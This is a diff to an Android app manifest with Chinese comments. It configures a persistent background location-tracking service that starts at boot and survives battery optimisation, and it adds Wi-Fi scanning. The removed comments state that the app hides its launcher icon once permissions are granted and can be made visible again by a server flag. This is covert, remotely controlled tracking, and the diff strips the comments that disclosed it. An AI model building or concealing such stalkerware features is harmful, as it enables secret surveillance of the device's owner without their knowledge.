@@ -6,9 +6,10 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <!-- 扫描周围 Wi-Fi 热点需要改变 Wi-Fi 状态 -->
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <!-- Android 10+ 后台定位（前台服务类型为 location 时必需，否则锁屏后拿不到位置） -->
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
     <!-- 前台服务与高版本定位服务类型权限 -->
@@ -16,9 +17,9 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- Android 13+ 通知权限（可选申请，不申请则常驻通知不显示，但服务照常运行） -->
+    <!-- Android 13+ 通知权限（可选，不影响服务运行） -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <!-- 引导用户关闭电池优化，保活后台服务 -->
+    <!-- 引导关闭电池优化 -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
@@ -26,14 +27,12 @@
         android:usesCleartextTraffic="true"
         android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
 
-        <!-- 后台常驻守护服务 -->
         <service
             android:name=".TrackingService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="location" />
 
-        <!-- 开机自启广播接收器 -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -45,7 +44,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- 1. 默认隐身入口（无桌面图标，授权完成后由代码隐藏可见入口） -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -55,9 +53,6 @@
             </intent-filter>
         </activity>
 
-        <!-- 2. 首次可见入口（带桌面图标）：用户装完 App 后靠它打开并完成授权，
-             授权完成后 MainActivity 会自动把本 alias 禁用，实现"用完即隐身"。
-             后续可通过服务端下发的 hide_icon=false 重新显形。 -->
         <activity-alias
             android:name=".VisibleAliasActivity"
             android:enabled="true"
